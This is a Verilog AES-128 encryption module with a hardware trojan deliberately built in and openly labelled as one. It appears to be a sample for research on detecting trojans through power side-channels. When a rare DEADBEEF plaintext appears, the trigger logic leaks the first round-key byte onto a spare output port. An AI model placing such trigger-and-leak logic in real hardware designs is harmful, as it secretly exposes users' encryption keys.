// TROJAN VARIANT 1: Rare-Pattern Trigger + Key Leak Payload
// -----------------------------------------------------------------------
// Trigger:  Combinational. Watches the plaintext input. Only activates
//           when plaintext == 128'hDEADBEEF_DEADBEEF_DEADBEEF_DEADBEEF
//           (an extremely rare, attacker-chosen fixed pattern).
// Payload:  When triggered, leaks the first byte of the round key onto
//           a spare output port (leak_out) instead of leaving it unused.
//           In a real attack this would be routed to an unused pin or
//           side-channel-observable signal.
// Stealth:  Under all normal/random plaintexts, leak_out stays 0 and
//           encryption is bit-for-bit identical to the clean baseline.
//           Extra hardware = 1x 128-bit comparator + 1x 8-bit register,
//           small but nonzero power/area footprint -- this is what your
//           power side-channel should pick up even though it never fires.
// -----------------------------------------------------------------------

module aes_128_trojan_leak (
    input  wire         clk,
    input  wire         rst,
    input  wire         start,
    input  wire [127:0] plaintext,
    input  wire [127:0] key,
    output reg  [127:0] ciphertext,
    output reg          done,
    output reg  [7:0]   leak_out      // Trojan payload output (would be hidden/unused pin)
);

    localparam [127:0] TRIGGER_PATTERN = 128'hDEADBEEFDEADBEEFDEADBEEFDEADBEEF;

    // ---- TROJAN TRIGGER LOGIC ----
    wire trojan_trigger = (plaintext == TRIGGER_PATTERN);

    // ---- Key expansion (identical to clean baseline) ----
    wire [127:0] rk0, rk1, rk2, rk3, rk4, rk5, rk6, rk7, rk8, rk9, rk10;
    key_expansion u_ke (
        .key(key),
        .round_key0(rk0), .round_key1(rk1), .round_key2(rk2), .round_key3(rk3),
        .round_key4(rk4), .round_key5(rk5), .round_key6(rk6), .round_key7(rk7),
        .round_key8(rk8), .round_key9(rk9), .round_key10(rk10)
    );

    localparam IDLE = 2'd0, RUN = 2'd1, DONE_ST = 2'd2;
    reg [1:0]   fsm_state;
    reg [127:0] state_reg;
    reg [3:0]   round_cnt;

    reg [127:0] cur_round_key;
    always @(*) begin
        case (round_cnt)
            4'd0:  cur_round_key = rk0;
            4'd1:  cur_round_key = rk1;
            4'd2:  cur_round_key = rk2;
            4'd3:  cur_round_key = rk3;
            4'd4:  cur_round_key = rk4;
            4'd5:  cur_round_key = rk5;
            4'd6:  cur_round_key = rk6;
            4'd7:  cur_round_key = rk7;
            4'd8:  cur_round_key = rk8;
            4'd9:  cur_round_key = rk9;
            4'd10: cur_round_key = rk10;
            default: cur_round_key = 128'd0;
        endcase
    end

    wire [127:0] sb_out, sr_out, mc_out, ark_out;
    sub_bytes   u_sb (.state_in(state_reg), .state_out(sb_out));
    shift_rows  u_sr (.state_in(sb_out),    .state_out(sr_out));
    mix_columns u_mc (.state_in(sr_out),    .state_out(mc_out));

    wire [127:0] pre_ark = (round_cnt == 4'd10) ? sr_out : mc_out;
    add_round_key u_ark (.state_in(pre_ark), .round_key(cur_round_key), .state_out(ark_out));

    always @(posedge clk) begin
        if (rst) begin
            fsm_state  <= IDLE;
            state_reg  <= 128'd0;
            round_cnt  <= 4'd0;
            ciphertext <= 128'd0;
            done       <= 1'b0;
            leak_out   <= 8'd0;
        end else begin
            case (fsm_state)
                IDLE: begin
                    done <= 1'b0;
                    if (start) begin
                        state_reg <= plaintext ^ rk0;
                        round_cnt <= 4'd1;
                        fsm_state <= RUN;

                        // TROJAN PAYLOAD
                        // Only writes non-zero when the rare trigger fires;
                        // otherwise behaves exactly like the clean design.
                        if (trojan_trigger)
                            leak_out <= rk0[127:120]; // leak first key byte
                        else
                            leak_out <= 8'd0;
                    end
                end

                RUN: begin
                    state_reg <= ark_out;
                    if (round_cnt == 4'd10)
                        fsm_state <= DONE_ST;
                    else
                        round_cnt <= round_cnt + 4'd1;
                end

                DONE_ST: begin
                    ciphertext <= state_reg;
                    done       <= 1'b1;
                    fsm_state  <= IDLE;
                end

                default: fsm_state <= IDLE;
            endcase
        end
    end

endmodule
